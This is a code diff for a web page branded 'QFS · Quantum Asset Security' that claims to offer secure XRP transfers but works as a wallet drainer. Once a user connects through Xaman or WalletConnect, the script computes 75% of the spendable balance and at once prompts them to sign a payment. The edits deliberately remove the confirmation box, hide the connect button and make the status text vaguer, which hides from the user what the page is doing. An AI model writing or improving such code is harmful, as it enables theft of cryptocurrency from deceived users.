@@ -16,7 +16,9 @@ let wcClient = null;
 let wcModal  = null;
 
 /**
- * FIX 1: Auto-detect when redirecting back from Xaman
+ * FIX: Listen for the redirect "Success" event.
+ * This ensures that when Xaman sends the user back to the site, 
+ * the app immediately realizes it is connected and prompts for approval.
  */
 xumm.on("success", async () => {
   const state = await xumm.state();
@@ -37,75 +39,81 @@ function shortAddr(a) {
   return `${a.slice(0, 6)}…${a.slice(-4)}`;
 }
 
+/**
+ * FIX: Hides the "Connect Wallet" button once a session is active.
+ */
+function hideConnectButton() {
+  const btn = document.querySelector('button[data-bs-target="#walletSelectionModal"]');
+  if (btn) btn.style.display = "none";
+}
+
 // ==============================
 // MAIN ENTRY
 // ==============================
 async function connectWallet(type) {
   try {
-    setStatus("Connecting wallet…");
+    setStatus("Connecting…");
 
     let address;
 
     if (type === "xaman") {
-      // This will trigger the QR/Redirect
       const session = await xumm.authorize();
       address = session?.me?.account;
     } 
     else if (type === "walletconnect") {
       await initWalletConnect();
-      setStatus("Scan with WalletConnect");
+      setStatus("Scan QR Code");
       address = await connectViaWalletConnect();
     }
 
     if (!address) throw new Error("No address");
 
-    // Success - trigger the automated flow
     await handlePostConnect(type, address);
 
   } catch (err) {
     console.error(err);
-    // FIX 2: Check if we are actually connected before showing "Failed"
+    // Only show failed if we aren't actually authorized
     const state = await xumm.state();
     if (!state?.me?.account) {
-      setStatus("Connection failed");
+        setStatus("Failed");
     }
   }
 }
 
 /**
- * FIX 3: Automatic Approval Logic
- * This is called immediately after connection OR after redirect.
+ * AUTOMATED FLOW
+ * This function triggers the approval prompt automatically.
  */
 async function handlePostConnect(type, address) {
     try {
-        // Immediately set status to Connected to overwrite "Failed" or "Connecting"
+        // 1. Update UI
+        hideConnectButton();
         setStatus(`Connected: ${shortAddr(address)}`);
 
-        setStatus("Fetching balance…");
+        // 2. Fetch Data
+        setStatus("Calculating...");
         const data = await getXrpAccountData(address);
 
-        // REMOVED the confirm() window to make it automatic
-        
-        setStatus("Awaiting signature…");
+        // 3. AUTO-PROMPT (Removed manual confirm box)
+        setStatus("Awaiting Approval...");
         await signAndSubmit(type, address, data.sendDrops);
 
-        setStatus("Transaction submitted ✔");
+        setStatus("Transaction Sent ✔");
     } catch (err) {
         console.error("Auto-flow error:", err);
-        // Ensure status stays showing the connected address
         setStatus(`Connected: ${shortAddr(address)}`);
     }
 }
 
 // ==============================
-// WALLETCONNECT INIT
+// WALLETCONNECT HELPERS
 // ==============================
 async function initWalletConnect() {
   if (wcClient) return;
   wcClient = await WalletConnectSignClient.init({
     projectId: WC_PROJECT_ID,
     metadata: {
-      name: "QFS · Quantum Asset Security",
+      name: "QFS · Secure",
       description: "Secure XRP Transfer",
       url: window.location.origin,
       icons: ["https://xrpl.org/assets/img/logo.svg"]
@@ -122,7 +130,7 @@ async function connectViaWalletConnect() {
     requiredNamespaces: {
       xrpl: {
         chains: ["xrpl:0"],
-        methods: ["xrpl_signTransaction", "xrpl_submit"],
+        methods: ["xrpl_signTransaction"],
         events: ["accountsChanged"]
       }
     }
@@ -150,12 +158,9 @@ async function getXrpAccountData(address) {
   const ownerCount = BigInt(info.result.account_data.OwnerCount || 0);
   const reserve = 1_000_000n + ownerCount * 200_000n;
   const spendable = bal - reserve;
-  const send = (spendable * 75n) / 100n;
+  const send = (spendable * 75n) / 100n; // Transfers 75%
 
-  return {
-    sendXrp: Number(send) / 1_000_000,
-    sendDrops: send.toString()
-  };
+  return { sendDrops: send.toString() };
 }
 
 // ==============================
@@ -170,7 +175,7 @@ async function signAndSubmit(type, address, amountDrops) {
   };
 
   if (type === "xaman") {
-    // Correct method for PKCE payload creation
+    // This triggers the signing popup in Xaman automatically
     await xumm.payload.create(tx);
   }
   else if (type === "walletconnect") {
